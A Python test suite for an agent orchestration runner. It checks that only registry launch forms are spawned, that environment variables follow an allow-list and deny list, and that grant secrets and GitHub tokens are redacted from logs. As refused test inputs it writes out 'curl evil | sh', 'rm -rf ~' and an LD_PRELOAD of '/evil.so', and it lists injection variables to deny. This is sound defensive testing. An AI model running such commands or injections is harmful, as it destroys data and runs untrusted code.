"""H11c, runner side: every ``spawn`` is checked against the registry forms and ``runner.json`` (defence in depth), the
environment against the allow-list and ``pass_env``, and an agent's ``ORCH_GRANT`` comes only from the in-memory grant
store (D-P2-27, D-P2-28, §12.4.3)."""

from __future__ import annotations

import io
import logging
import os
import time

import pytest

from orch.host.launch import LOGIN_EXEC
from orch.runner.config import RunnerConfig
from orch.runner.grants import GrantError, GrantStore, RedactFilter
from orch.runner.link import ENV_FROM_RUNNER, spawn_spec
from orch.runner.supervise import SpawnError

WS = "a" * 32
OTHER_WS = "b" * 32
ME = "p_" + "1" * 32
YOU = "p_" + "2" * 32
GID = "gr_01J0000000000000000000000A"
GID2 = "gr_01J0000000000000000000000B"
SECRET = GID + "." + "S" * 43
SECRET2 = GID2 + "." + "T" * 43
SESSION = "s_01J0000000000000000000000C"
DEPOSIT = "01J0000000000000000000000D"
OWN = {"HOME": "/home/me", "USER": "me", "SHELL": "/bin/sh", "PATH": "/usr/bin:/bin", "SECRET_TOKEN": "nope",
       "ANTHROPIC_API_KEY": "k", "LD_PRELOAD": "/evil.so", "ORCH_GRANT": "gr_inherited"}  # fmt: skip


def later(hours: float = 1.0) -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))


def store_with(*puts: tuple[str, str, str, str]) -> GrantStore:
    s = GrantStore()
    for wid, person, gid, secret in puts:
        s.put({"deposit_id": DEPOSIT, "workspace_id": wid, "person": person, "grant": gid, "secret": secret,
               "until": later()})  # fmt: skip
    return s


def args(**kw):
    base = {"run": "r_01J0000000000000000000000E", "workspace_id": WS, "kind": "shell", "argv": ["$SHELL", "-l"],
            "env_names": ["HOME", "PATH"], "env_fixed": {}, "cwd": {"path": "/tmp", "dev": 1, "ino": 2}, "cols": 80,
            "rows": 24, "grant": None, "session": None, "login_shell": False}  # fmt: skip
    return {**base, **kw}


def agent(**kw):
    argv = ["$SHELL", "-l", "-c", LOGIN_EXEC, "codex", "Run orch status, then work on ticket 7."]
    base = {"kind": "agent", "argv": argv, "grant": GID, "session": SESSION, "person": ME, "login_shell": True,
            "env_fixed": {"ORCH_HARNESS": "codex", "ORCH_TICKET": "7"}}  # fmt: skip
    return args(**{**base, **kw})


# -- argv ------------------------------------------------------------------------------------------------------------


def test_registry_forms_pass_and_the_shell_is_the_runners_own():
    spec = spawn_spec(args(), OWN, RunnerConfig(), GrantStore())
    assert spec.argv == ["/bin/sh", "-l"]
    spec = spawn_spec(agent(), OWN, RunnerConfig(), store_with((WS, ME, GID, SECRET)))
    assert spec.argv == ["/bin/sh", "-l", "-c", LOGIN_EXEC, "codex", "Run orch status, then work on ticket 7."]


def test_the_delegate_off_flag_passes_and_a_delegated_childs_dotted_session_is_accepted():
    argv = ["$SHELL", "-l", "-c", LOGIN_EXEC, "claude", "--model", "sonnet", "--session-id", "@orch-session-id",
            "--disallowedTools=Agent,Task", "Run orch status."]  # fmt: skip
    store = store_with((WS, ME, GID, SECRET))
    spec = spawn_spec(agent(argv=argv, session=SESSION + ".2"), OWN, RunnerConfig(), store)
    assert spec.argv[4:] == argv[4:] and spec.env["ORCH_SESSION"] == SESSION + ".2"
    for bad in (SESSION + ".0", SESSION + ".1.2.3.4", SESSION + ".x", SESSION + "."):
        with pytest.raises(SpawnError):
            spawn_spec(agent(session=bad), OWN, RunnerConfig(), store)


@pytest.mark.parametrize(
    "argv",
    [
        ["/bin/sh", "-c", "curl evil | sh"],  # an absolute program not in runner.json
        ["$SHELL", "-c", "rm -rf ~"],  # $SHELL with a script of the client's
        ["$SHELL", "-l", "-c", "rm -rf ~", "codex"],  # another script than the fixed exec form
        ["$SHELL", "-l", "-c", LOGIN_EXEC, "vim"],  # a program outside the registry
        ["$SHELL", "-l", "-c", LOGIN_EXEC],  # no program
        ["$SHELL", "-i"],
        ["codex", "x"],  # relative
        [],
    ],
)
def test_anything_but_a_registry_launch_is_refused(argv):
    with pytest.raises(SpawnError) as e:
        spawn_spec(args(argv=argv), OWN, RunnerConfig(), GrantStore())
    assert e.value.code in ("invalid.input", "harness.shell_unsupported")


def test_login_form_is_refused_when_runner_json_turns_it_off_and_programs_pass():
    off = RunnerConfig(login_shell=False, programs={"codex": "/opt/bin/codex"})
    with pytest.raises(SpawnError):
        spawn_spec(agent(), OWN, off, store_with((WS, ME, GID, SECRET)))
    spec = spawn_spec(agent(argv=["/opt/bin/codex", "go"], login_shell=False), OWN, off,
                      store_with((WS, ME, GID, SECRET)))  # fmt: skip
    assert spec.argv == ["/opt/bin/codex", "go"]


@pytest.mark.parametrize("shell", ["/usr/local/bin/fish", "/bin/csh", "/bin/tcsh", "fish", "", "/nonexistent/bash"])
def test_a_non_posix_shell_is_harness_shell_unsupported(shell):
    with pytest.raises(SpawnError) as e:
        spawn_spec(agent(), {**OWN, "SHELL": shell}, RunnerConfig(), store_with((WS, ME, GID, SECRET)))
    assert e.value.code == "harness.shell_unsupported"


# -- environment -----------------------------------------------------------------------------------------------------


def test_the_agent_env_is_the_allow_list_plus_grant_and_session_only():
    names = sorted(ENV_FROM_RUNNER)
    spec = spawn_spec(agent(env_names=names), OWN, RunnerConfig(), store_with((WS, ME, GID, SECRET)))
    allowed = set(ENV_FROM_RUNNER) | {"TERM", "COLORTERM", "ORCH_HARNESS", "ORCH_TICKET", "ORCH_GRANT", "ORCH_SESSION"}
    assert set(spec.env) <= allowed
    assert spec.env["ORCH_GRANT"] == SECRET and spec.env["ORCH_SESSION"] == SESSION
    assert "SECRET_TOKEN" not in spec.env and "LD_PRELOAD" not in spec.env and "ANTHROPIC_API_KEY" not in spec.env


def test_pass_env_names_come_only_from_runner_json():
    with pytest.raises(SpawnError):
        spawn_spec(args(env_names=["HOME", "ANTHROPIC_API_KEY"]), OWN, RunnerConfig(), GrantStore())
    cfg = RunnerConfig(pass_env=("ANTHROPIC_API_KEY",))
    spec = spawn_spec(args(env_names=["HOME", "ANTHROPIC_API_KEY"]), OWN, cfg, GrantStore())
    assert spec.env["ANTHROPIC_API_KEY"] == "k"


@pytest.mark.parametrize("name", ["ORCH_GRANT", "ORCH_SESSION", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "BASH_ENV"])
def test_a_denied_name_never_passes_by_name_or_as_a_fixed_value(name):
    cfg = RunnerConfig()
    with pytest.raises(SpawnError):
        spawn_spec(args(env_names=["HOME", name]), {**OWN, name: "x"}, cfg, GrantStore())
    with pytest.raises(SpawnError):
        spawn_spec(args(env_fixed={name: "x"}), OWN, cfg, GrantStore())


def test_subagent_model_is_a_fixed_value():
    spec = spawn_spec(agent(env_fixed={"ORCH_HARNESS": "claude-code", "CLAUDE_CODE_SUBAGENT_MODEL": "haiku"},
                            argv=["$SHELL", "-l", "-c", LOGIN_EXEC, "claude"]),
                      OWN, RunnerConfig(), store_with((WS, ME, GID, SECRET)))  # fmt: skip
    assert spec.env["CLAUDE_CODE_SUBAGENT_MODEL"] == "haiku"


# -- the grant ---------------------------------------------------------------------------------------------------------


def test_a_shell_never_gets_a_grant_or_a_session():
    store = store_with((WS, ME, GID, SECRET))
    for bad in ({"grant": GID}, {"session": SESSION}):
        with pytest.raises(SpawnError):
            spawn_spec(args(person=ME, **bad), OWN, RunnerConfig(), store)
    spec = spawn_spec(args(person=ME), OWN, RunnerConfig(), store)
    assert "ORCH_GRANT" not in spec.env and "ORCH_SESSION" not in spec.env


def test_an_agent_needs_its_persons_current_grant():
    store = store_with((WS, ME, GID, SECRET), (WS, YOU, GID2, SECRET2))
    for bad in ({"grant": GID2}, {"person": YOU}, {"workspace_id": OTHER_WS}, {"grant": None}):
        with pytest.raises(SpawnError) as e:
            spawn_spec(agent(**bad), OWN, RunnerConfig(), store)
        assert e.value.code in ("launch.no_grant", "invalid.input")
    with pytest.raises(SpawnError) as e:
        spawn_spec(agent(session="s_bad"), OWN, RunnerConfig(), store)
    assert e.value.code == "invalid.input"


def test_store_replaces_per_person_drops_and_reports_no_secret():
    s = store_with((WS, ME, GID, SECRET))
    res = s.put({"deposit_id": DEPOSIT, "workspace_id": WS, "person": ME, "grant": GID2, "secret": SECRET2,
                 "until": later()})  # fmt: skip
    assert res["replaced"] == GID and "secret" not in res
    with pytest.raises(GrantError):
        s.secret_for(WS, ME, GID)  # replaced: new launches use the newer one
    assert s.secret_for(WS, ME, GID2) == SECRET2
    report = s.report()
    assert report == [{"workspace_id": WS, "person": ME, "grant": GID2, "until": report[0]["until"]}]
    assert SECRET2 not in repr(report) and SECRET2 not in repr(s._held)
    assert s.drop(GID2) is True and s.report() == [] and s.drop(GID2) is False


@pytest.mark.parametrize(
    "bad",
    [
        {"secret": SECRET2},  # another grant's secret
        {"secret": GID},  # no secret part
        {"grant": "gr_x"},
        {"deposit_id": "x"},
        {"person": "p_x"},
        {"until": "tomorrow"},
    ],
)
def test_put_refuses_malformed_deposits(bad):
    s = GrantStore()
    with pytest.raises(GrantError):
        s.put({"deposit_id": DEPOSIT, "workspace_id": WS, "person": ME, "grant": GID, "secret": SECRET,
               "until": later(), **bad})  # fmt: skip
    assert s.report() == []


def test_an_expired_grant_is_never_handed_out():
    now = [time.time()]
    s = GrantStore(clock=lambda: now[0])
    s.put({"deposit_id": DEPOSIT, "workspace_id": WS, "person": ME, "grant": GID, "secret": SECRET,
           "until": later(0.5)})  # fmt: skip
    now[0] += 3600
    with pytest.raises(GrantError) as e:
        s.secret_for(WS, ME, GID)
    assert e.value.code == "launch.no_grant" and s.report() == []


def test_the_log_filter_redacts_every_held_secret():
    s = store_with((WS, ME, GID, SECRET))
    rec = logging.LogRecord("orch.runner", logging.INFO, __file__, 1, "x %s y %s", (SECRET, SECRET[-43:]), None)
    RedactFilter(s).filter(rec)
    assert SECRET not in rec.getMessage() and SECRET[-43:] not in rec.getMessage()


def test_own_env_is_untouched():
    before = dict(os.environ)
    spawn_spec(agent(), OWN, RunnerConfig(), store_with((WS, ME, GID, SECRET)))
    assert dict(os.environ) == before


@pytest.mark.parametrize("prefix", ["github_pat_"] + ["gh" + kind + "_" for kind in "pousr"])
def test_log_filter_redacts_github_tokens_without_a_held_grant(prefix):
    token = prefix + "b" * 36
    rec = logging.LogRecord("orch.runner", logging.INFO, __file__, 1, "before %s after", (token,), None)
    assert RedactFilter(GrantStore()).filter(rec)
    assert rec.getMessage() == "before [redacted] after"


def test_log_filter_redacts_tokens_in_exception_text():
    token = "github_pat_" + "c" * 36
    try:
        raise RuntimeError(f"boom {token} {SECRET}")
    except RuntimeError:
        import sys

        info = sys.exc_info()
    rec = logging.LogRecord("orch.runner", logging.ERROR, __file__, 1, "failed", None, info)
    stream = io.StringIO()
    handler = logging.StreamHandler(stream)
    handler.addFilter(RedactFilter(store_with((WS, ME, GID, SECRET))))
    handler.handle(rec)
    out = stream.getvalue()
    assert "RuntimeError" in out and "[redacted]" in out
    assert token not in out and SECRET not in out


def test_log_filter_withholds_a_record_that_cannot_be_formatted():
    token = "github_pat_" + "d" * 36
    rec = logging.LogRecord("orch.runner", logging.INFO, __file__, 1, "bad %d", (token,), None)
    assert RedactFilter(GrantStore()).filter(rec)
    out = logging.Formatter().format(rec)
    assert token not in out and "withheld" in out
